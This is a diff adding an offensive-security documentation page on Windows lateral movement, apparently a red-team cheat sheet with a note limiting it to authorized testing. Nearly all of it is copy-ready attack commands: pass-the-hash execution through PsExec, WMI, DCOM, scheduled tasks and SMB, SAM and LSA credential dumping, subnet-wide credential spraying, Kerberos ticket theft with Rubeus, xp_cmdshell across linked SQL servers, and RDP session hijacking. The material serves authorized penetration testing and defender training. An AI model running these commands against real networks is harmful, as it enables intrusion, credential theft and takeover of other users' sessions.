@@ -1,0 +1,228 @@
+---
+title: "Windows Lateral Movement"
+description: "Windows lateral movement techniques: PsExec, WMI, WinRM, DCOM, SMBExec, RDP, scheduled tasks, and credential reuse"
+---
+
+## Overview
+
+Lateral movement in Windows environments involves using compromised credentials, hashes, or tickets to execute commands on other systems within the network. This page covers the primary Windows lateral movement techniques and their tradeoffs.
+
+<Warning>
+Lateral movement techniques described here are for authorized penetration testing and red team operations only.
+</Warning>
+
+## Core Lateral Movement Techniques
+
+<CardGroup cols={2}>
+  <Card title="PsExec" icon="terminal">
+    Creates a remote service to execute commands. Requires admin rights. Writes a service binary to disk — noisier than alternatives.
+  </Card>
+  <Card title="WMI / WmiExec" icon="code">
+    Uses Windows Management Instrumentation for remote execution. Leaves fewer traces than PsExec. Requires admin rights.
+  </Card>
+  <Card title="WinRM / PSRemoting" icon="network-wired">
+    PowerShell remoting over HTTP/HTTPS. Clean and scriptable. Requires WinRM enabled on the target.
+  </Card>
+  <Card title="DCOM Exec" icon="cube">
+    Uses COM objects (MMC20.Application, ShellWindows, ShellBrowserWindow) for remote execution. Rarely blocked by firewalls.
+  </Card>
+  <Card title="AtExec / SchtasksExec" icon="clock">
+    Creates a scheduled task on the remote system to execute commands. Useful when other methods are blocked.
+  </Card>
+  <Card title="SMBExec" icon="server">
+    Similar to PsExec but uses named pipes over SMB. Does not write a service binary — slightly stealthier.
+  </Card>
+</CardGroup>
+
+## PsExec
+
+PsExec creates a service on the remote host that runs commands as SYSTEM:
+
+```bash
+# Sysinternals PsExec
+PsExec.exe \\target -u domain\user -p password cmd.exe
+
+# Impacket psexec.py
+psexec.py domain/user:password@target
+
+# With hash (Pass-the-Hash)
+psexec.py -hashes :<NT_hash> domain/user@target
+```
+
+## WMI Execution (WmiExec)
+
+```bash
+# Impacket wmiexec
+wmiexec.py domain/user:password@target
+
+# With hash
+wmiexec.py -hashes :<NT_hash> domain/user@target
+
+# CMD one-liner via WMI
+wmic /node:<target> /user:<domain>\<user> /password:<pass> process call create "cmd.exe /c whoami > C:\output.txt"
+```
+
+## WinRM / PSRemoting
+
+```bash
+# Check if WinRM is accessible
+Test-NetConnection -ComputerName target -Port 5985
+
+# Enable PSRemoting (requires admin)
+Enable-PSRemoting -Force
+
+# Execute remote command
+Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred
+
+# Interactive remote session
+Enter-PSSession -ComputerName target -Credential $cred
+
+# CrackMapExec
+crackmapexec winrm target -u user -p password
+crackmapexec winrm target -u user -H <NT_hash>
+```
+
+## DCOM Execution
+
+```bash
+# Via Impacket dcomexec
+dcomexec.py domain/user:password@target
+
+# With hash
+dcomexec.py -hashes :<NT_hash> domain/user@target
+
+# Manual PowerShell DCOM via MMC20.Application
+$com = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("MMC20.Application", "target"))
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\output.txt", "7")
+```
+
+## Scheduled Tasks (AtExec / SchtasksExec)
+
+```bash
+# Impacket atexec
+atexec.py domain/user:password@target "whoami"
+
+# Native schtasks
+schtasks /create /s target /u domain\user /p password \
+  /tn "backdoor" /tr "cmd.exe /c whoami > C:\output.txt" /sc once /st 00:00
+schtasks /run /s target /tn "backdoor"
+schtasks /delete /s target /tn "backdoor" /f
+```
+
+## RDP Lateral Movement
+
+```bash
+# Standard RDP connection
+xfreerdp /v:target /u:domain\\user /p:password /cert:ignore
+
+# RDP with Pass-the-Hash (requires Restricted Admin mode enabled)
+xfreerdp /v:target /u:user /pth:<NT_hash> /cert:ignore
+
+# Enable Restricted Admin on target (requires registry write)
+reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
+```
+
+## SCM Execution (SCMExec)
+
+Use the Service Control Manager to create and execute a service:
+
+```bash
+# Impacket smbexec
+smbexec.py domain/user:password@target
+```
+
+## CrackMapExec for Lateral Movement
+
+CrackMapExec (CME) / NetExec provides a unified interface for many lateral movement methods:
+
+```bash
+# SMB with password
+crackmapexec smb targets.txt -u user -p password
+
+# SMB with hash (Pass-the-Hash)
+crackmapexec smb targets.txt -u user -H <NT_hash>
+
+# Execute commands
+crackmapexec smb target -u user -p password -x "whoami"
+crackmapexec smb target -u user -p password -X "Get-Process"
+
+# Dump SAM
+crackmapexec smb target -u user -p password --sam
+
+# Dump LSA secrets
+crackmapexec smb target -u user -p password --lsa
+
+# WinRM execution
+crackmapexec winrm target -u user -p password -x "whoami"
+```
+
+## Credential Reuse Spraying
+
+```bash
+# Spray found local admin credentials across subnet
+crackmapexec smb --local-auth 10.10.10.0/23 -u administrator -H <hash> | grep "+"
+
+# Domain credential spray
+crackmapexec smb 10.10.10.0/23 -u domain_user -p password | grep "+"
+```
+
+## Pass-the-Ticket for Lateral Movement
+
+```bash
+# List current tickets
+.\Rubeus.exe triage
+
+# Dump a specific ticket by LUID
+.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
+
+# Import ticket into current session
+[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
+.\Rubeus.exe ptt /ticket:ticket.kirbi
+
+# Verify ticket was imported
+klist
+```
+
+## MSSQL Lateral Movement
+
+```bash
+# Execute commands via MSSQL (xp_cmdshell)
+# Impacket mssqlclient
+mssqlclient.py domain/user:password@target -windows-auth
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell "whoami"
+
+# Follow database links across domains
+SQL> select * from openquery([linked_server], 'select @@servername')
+SQL> select * from openquery([linked_server], 'exec xp_cmdshell ''whoami''')
+```
+
+## RDP Session Injection (Third-Party Sessions)
+
+If you have SYSTEM access and another user has an active (even disconnected) RDP session:
+
+```bash
+# List RDP sessions
+qwinsta
+
+# Hijack disconnected session (requires SYSTEM)
+tscon <session_id> /dest:<current_session>
+
+# Or via task scheduler to avoid prompts
+schtasks /create /tn "hijack" /sc once /st 00:00 \
+  /tr "tscon <target_session_id> /dest:<our_session>" /ru SYSTEM
+schtasks /run /tn "hijack"
+```
+
+## Cloud Lateral Movement
+
+- **Pass-the-Cookie** — steal Azure AD SSO cookies from browser memory
+- **Pass-the-PRT** — use Primary Refresh Tokens for Azure AD auth
+- **Pass-the-Certificate** — use Azure AD device certificates for auth
+
+## References
+
+- [Impacket](https://github.com/fortra/impacket)
+- [CrackMapExec / NetExec](https://github.com/Pennyw0rth/NetExec)
+- [Rubeus](https://github.com/GhostPack/Rubeus)
+- [LOLBAS — Living Off the Land Binaries](https://lolbas-project.github.io/)
